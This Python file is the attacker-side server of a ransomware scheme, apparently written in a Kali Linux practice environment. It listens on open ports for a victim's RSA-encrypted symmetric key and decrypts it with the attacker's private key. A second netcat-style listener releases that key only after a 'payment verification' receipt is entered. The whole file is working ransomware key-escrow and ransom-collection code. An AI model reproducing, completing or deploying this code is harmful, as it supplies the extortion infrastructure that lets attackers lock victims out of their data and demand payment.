import socketserver
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes

# Load RSA private key
def load_private_key():
    with open("/home/kali/allan_python/cryptography/private_key.key", "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None  # Update this if your private key is encrypted
        )
    return private_key

# Store the decrypted symmetric key
decrypted_symmetric_key = None

class ClientHandler(socketserver.BaseRequestHandler):
    def handle(self):
        global decrypted_symmetric_key
        private_key = load_private_key()

        # Receive the encrypted symmetric key
        encrypted_key = self.request.recv(4096).strip()
        if not encrypted_key:
            self.request.sendall(b"Error: No key received. Closing connection.\n")
            return

        # Save and decrypt the symmetric key
        try:
            with open("received_encrypted_key.bin", "wb") as file:
                file.write(encrypted_key)
            decrypted_symmetric_key = private_key.decrypt(
                encrypted_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            self.request.sendall(b"Key received successfully.\n")
        except Exception as e:
            self.request.sendall(b"Error during decryption: " + str(e).encode() + b"\n")

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 8000  # Listen on all interfaces
    server = socketserver.TCPServer((HOST, PORT), ClientHandler)
    print("Server started. Waiting for encrypted key...")

    try:
        # Start the server to receive the encrypted symmetric key
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server.")
        server.server_close()

    # Handle payment verification via netcat
    print("\nWaiting for payment verification via netcat...")
    import socket

    # Set up a simple listener for nc connection
    RECEIPT_PORT = 8001
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as nc_server:
        nc_server.bind((HOST, RECEIPT_PORT))
        nc_server.listen(1)
        print(f"Payment verification server listening on port {RECEIPT_PORT}...")

        conn, addr = nc_server.accept()
        with conn:
            print(f"Connection established with {addr}.")
            conn.sendall(b"Enter transaction receipt for verification: ")

            # Receive the receipt and validate
            receipt = conn.recv(1024).strip().decode()
            if receipt == "1234":
                conn.sendall(b"Payment verified. Sending symmetric key...\n")
                conn.sendall(b"Decrypted Symmetric Key: " + decrypted_symmetric_key + b"\n")
                print("Payment verified and key sent.")
            else:
                conn.sendall(b"Invalid receipt. Closing connection.\n")
                print("Invalid receipt received.")
